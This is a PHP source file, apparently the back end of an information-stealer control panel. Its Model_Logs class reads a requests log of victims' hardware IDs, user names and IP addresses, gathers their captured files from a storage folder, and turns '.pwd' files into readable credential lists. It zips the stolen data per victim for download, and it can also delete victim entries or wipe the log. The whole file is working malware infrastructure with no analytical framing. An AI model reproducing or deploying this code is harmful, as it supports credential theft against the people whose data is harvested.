<?php
	function rrmdir($dir, $res = false)
	{
		if (is_dir($dir))
		{
			$objects = scandir($dir);
			foreach ($objects as $object)
			{
				if ($object != "." && $object != "..")
				{
					if(filetype($dir."/".$object) == "dir")
					{
						rrmdir($dir."/".$object, true);
					}
					else unlink($dir."/".$object);
				}
			}
			reset($objects);
			if($res) rmdir($dir);
		}
	}
	function recscan($path)
	{
		$files = scan($path);
		$result = array();
		foreach($files as $file)
		{
			if((fileperms($file) & 0x4000) == 0x4000)
			{
				foreach(recscan($file) as $dile)
					$result[] = $dile;
			}
			else $result[] = $file;
		}
		return $result;
	}
	function scan($dir)
	{
		if(!file_exists($dir)) return null;
		$result = array();
		$files = array_diff(scandir($dir), array('..', '.', '.htaccess', 'cgi-bin', '.DS_Store'));
		foreach($files as $file) $result[] = "$dir/$file";
		return $result;
	}
	function find($dir, $mask)
	{
		$result = array();
		$files = scan($dir);
		if(!count($files)) return null;
		foreach($files as $file)
		{
			if((fileperms($file) & 0x4000) == 0x4000) 
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0)
				{
					$result[] = $file;
				}
				else
				{
					$temp = find($file, $mask);
					if(!count($temp)) continue;
					foreach($temp as $hall)
						$result[] = $hall;
				}
			}
			else
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0)
				{
					$result[] = $file;
				}
			}
		}
		return $result;
	}
	function onfind($dir, $mask)
	{
		$result = array();
		$files = scan($dir);
		if(!count($files)) return false;
		foreach($files as $file)
		{
			if((fileperms($file) & 0x4000) == 0x4000) 
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0) return true;
				else
				{
					$temp = find($file, $mask);
					if(!count($temp)) continue;
					foreach($temp as $hall)
						return true;
				}
			}
			else
			{
				if(strcmp(pathinfo($file)['filename'], $mask) === 0)
					return true;
			}
		}
		return false;
	}
	function createZip($files, $destination = '', $tod = '', $overwrite = false)
	{
		if(file_exists($destination) && !$overwrite) return false;
		$valid_files = array();
		if(is_array($files)) 
		{
			foreach($files as $file) 
			{
				if(file_exists($file))
				{
					$valid_files[] = $file;
				}
			}
		}
		if(count($valid_files))
		{
			$zip = new ZipArchive();
			if($zip->open($destination, $overwrite ? ZipArchive::OVERWRITE : ZipArchive::CREATE) !== true)
				return false;
			foreach($valid_files as $file)
			{
				$tmp = str_replace($tod, '', $file);
				if(is_dir($file))
					$zip->addEmptyDir($tmp);
				else
					$zip->addFile($file, $tmp);
			}
			$zip->close();
			return file_exists($destination);
		}
	}
	class Model_Logs extends Model
	{
		public function getLogs($page = 0, &$pcount = 1)
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$result = array();
			$isar = array();
			$users = explode('<:>', file_get_contents('gate/other/requests.log'));
			foreach($users as $key)
			{
				if(!empty($key))
				{
					$val = explode('<;>', $key);
					if(count($val) < 6) continue;
					if(!onfind('gate/storage', $val[6])) continue;
					$isar[] = $key;
				}
			}
			$curp = count($users);
			$pcount = ceil($curp / 50);
			if($page > $pcount) return null;
			$from = $page * 50;
			$tilde = ($page + 1) * 50;
			for($i=$from;$i<$tilde;$i++)
			{
				if($i > $curp || !isset($users[$i])) break;
				$usr = explode('<;>', $users[$i]);
				$result[] = array('users' => $usr, 'isreal' => in_array($users[$i], $isar));
			}
			return $result;
		}
		public function download_()
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$toscan = array();
			$curp = 0;
			$users = explode('<:>', file_get_contents('gate/other/requests.log'));
			$time = time();
			$tmpname = "temp/$time";
			foreach($users as $usr)
			{
				$val = explode('<;>', $usr);
				if(count($val) >= 6)
				{
					$sq = find('gate/storage', $val[6]);
					if(count($sq) > 0)
					{
						$hwid = $val[3];
						$name = $val[4];
						$sempname = "$tmpname/$hwid - $name";
						if(!file_exists($sempname))mkdir("$sempname", 0755, true);
						foreach($sq as $key)
						{
							$ftype = explode('/', $key)[2];
							if((fileperms($key) & 0x4000) == 0x4000) 
							{
								mkdir("$sempname/$ftype", 0755, true);
								$keks = scan($key);
								foreach($keks as $klo)
								{						
									$pinfo = pathinfo($klo);
									$ext = is_array($pinfo) && isset($pinfo['extension']) ? '.'.$pinfo['extension'] : '';
									$filename = pathinfo($klo)['filename'].$ext;
									copy($klo, "$sempname/$ftype/$filename");
								}
							}
							else
							{
								$ftruen = "$sempname/$ftype.txt";
								$entry = file_get_contents($key);
								$pinfo = pathinfo($key);
								$ext = is_array($pinfo) && isset($pinfo['extension']) ? '.'.$pinfo['extension'] : '';
								if(mb_strpos($ext, 'pwd') !== false)
								{
									$entry = str_replace('<;!:;>', ' - ', $entry);
									$entry = str_replace('<:;:!>', PHP_EOL, $entry);
								}
								$constName = $ftruen;
								for($i=0;file_exists($ftruen);$i++)
								{
									$woex = pathinfo($constName);
									$ftruen = $woex['dirname'].'/'.$woex['filename']." ($i)".(isset($woex['extension']) ? '.'.$woex['extension'] : '');
								}
								file_put_contents($ftruen, $entry);
							}
						}
					}
				}
			}
			$fls = recscan($tmpname);
			createZip($fls, "$tmpname.zip", "temp/$time/");
			header('Content-Type: application/octet-stream');
			header('Content-Length: '.filesize("$tmpname.zip"));
			header("Content-Disposition: attachment; filename=$tmpname.zip");
			readfile("$tmpname.zip");
			unlink("$tmpname.zip");
			rrmdir($tmpname, true);
		}
		public function upload_($unix, $hwid, $username, $ip)
		{
			$sq = find('gate/storage', $unix);
			if(count($sq) > 0)
			{
				$time = time();
				$tmpname = "temp/$time";
				mkdir("$tmpname", 0755, true);
				foreach($sq as $key)
				{
					$ftype = explode('/', $key)[2];
					if((fileperms($key) & 0x4000) == 0x4000) 
					{
						mkdir("$tmpname/$ftype", 0755, true);
						$keks = scan($key);
						foreach($keks as $klo)
						{						
							$pinfo = pathinfo($klo);
							$ext = is_array($pinfo) && isset($pinfo['extension']) ? '.'.$pinfo['extension'] : '';
							$filename = pathinfo($klo)['filename'].$ext;
							copy($klo, "$tmpname/$ftype/$filename");
						}
					}
					else
					{
						$entry = file_get_contents($key);
						$entry = "$hwid - $ip".PHP_EOL.PHP_EOL.$entry;
						$pinfo = pathinfo($key);
						$ext = is_array($pinfo) && isset($pinfo['extension']) ? '.'.$pinfo['extension'] : '';
						if(mb_strpos($ext, 'pwd') !== false)
						{
							$entry = str_replace('<;!:;>', ' - ', $entry);
							$entry = str_replace('<:;:!>', PHP_EOL, $entry);
							file_put_contents("$tmpname/$ftype.txt", $entry);
						}
						else
						{
							file_put_contents("$tmpname/$ftype.txt", $entry);
						}
					}
				}
				$fls = recscan($tmpname);
				createZip($fls, "$tmpname.zip", "temp/$time/");
				header('Content-Type: application/octet-stream');
				header('Content-Length: '.filesize("$tmpname.zip"));
				header("Content-Disposition: attachment; filename=$hwid - $username.zip");
				readfile("$tmpname.zip");
				unlink("$tmpname.zip");
				rrmdir($tmpname, true);
			}
			else return 'jarah';
		}
		public function cleanList()
		{
			unlink('gate/other/requests.log');
		}
		public function delete_($unix)
		{
			$fileName = 'gate/other/requests.log';
			$cont = file_get_contents($fileName);
			$uidx = mb_strpos($cont, $unix);
			$eidx = mb_strpos($cont, '<:>', $uidx) + 3;
			$strt = mb_substr($cont, 0, $uidx);
			$endt = mb_substr($cont, $eidx);
			file_put_contents($fileName, "$strt$endt");
		}
	}
?>